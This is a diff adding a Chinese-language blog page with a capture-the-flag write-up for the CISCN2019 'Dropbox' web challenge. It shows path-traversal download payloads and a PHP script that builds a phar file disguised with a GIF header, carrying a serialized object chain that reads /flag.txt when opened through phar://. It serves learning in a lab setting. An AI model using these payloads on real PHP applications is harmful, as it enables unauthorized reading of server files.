@@ -1,0 +1,263 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>[CISCN2019 华北赛区 Day1 Web1]Dropbox | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/3
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>我能说什么呢？好题，至少对于我这个新手真的震惊到了</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603204833820.png" alt="image-20240603204833820"></p>
+<p>首先是干吗呢？</p>
+<p>是尝试一下注入，发现没用所以开始疯狂抓包</p>
+<p>在点到下载的时候蹦出来</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603204936007.png" alt="image-20240603204936007"></p>
+<p>也就是说filename任我写是吧，所以我们开始找一些可以找到的文件</p>
+<p>捕捉的到的话，一个注册，一个登录，一个上传文件，一个下载，一个删除</p>
+<p>也就是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../register.php</span><br><span class="line">../../login.php</span><br><span class="line">../../upload.php</span><br><span class="line">../../download.php</span><br><span class="line">../../delete.php</span><br></pre></td></tr></table></figure>
+
+<p>考验你英语词汇的时候到了</p>
+<p>在这些文件里又发现了一个class.php‘</p>
+<p>一起下下来</p>
+<p>之后就是长长的审计代码</p>
+<p>发现几个有用消息</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603205332955.png" alt="image-20240603205332955"></p>
+<p>格式限制</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603205402910.png" alt="image-20240603205402910"></p>
+<p>不能上传带flag的文件</p>
+<p>还有，就是</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603205515097.png" alt="image-20240603205515097"></p>
+<p>发现两个魔术头</p>
+<p>一个call一个destruct</p>
+<p>怎么说呢</p>
+<p>__call()魔术方法会在对象调用的方法不存在时，自动执行</p>
+<p>所以我们后续要照一照有没有调用不存在的对象</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603211219708.png" alt="image-20240603211219708"></p>
+<p>在index.php里</p>
+<p>还有一个就是</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603205822773.png" alt="image-20240603205822773"></p>
+<p>也就是说，我只有可能从这个读到数据呗</p>
+<p>而在destruct中应用了</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603210024082.png" alt="image-20240603210024082"></p>
+<p>所以说，emm</p>
+<p>我们要想办法使用到这个</p>
+<p>接下来就是重点</p>
+<h4 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h4><p>这个文件的特点就是将一个学历恶化的对象存储到phar文件中生成之后，即使更改文件格式，也不会影响作用，之后再通过phar:&#x2F;&#x2F;协议去访问，就可以反序列化</p>
+<p>也就是说，我们需要</p>
+<p>创建一个phar文件，存储序列化对象，并在最后通过协议去读取</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User &#123;</span><br><span class="line">    public $db;</span><br><span class="line">&#125;</span><br><span class="line">class File &#123;</span><br><span class="line">    public $filename;</span><br><span class="line">&#125;</span><br><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;files = array();</span><br><span class="line">        $this-&gt;results = array();</span><br><span class="line">        $this-&gt;funcs = array();</span><br><span class="line"></span><br><span class="line">        $file = new File();</span><br><span class="line">        $file-&gt;filename = &#x27;/flag.txt&#x27;;	# 这里的flag.txt是多次猜测出来的</span><br><span class="line">        array_push($this-&gt;files, $file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = new User();</span><br><span class="line">$filelist = new FileList();</span><br><span class="line">$user-&gt;db = $filelist;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);  //设置stub，增加gif文件头</span><br><span class="line">$phar-&gt;setMetadata($user); //将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>脚本如下（直接下到脚本所在文件夹）</p>
+<p>之后，上传读取即可</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603211730723.png" alt="image-20240603211730723"></p>
+<p>读取方式：</p>
+<p>先上传，再删除，抓包，再使用伪协议读取，触发反序列化，读取flag</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
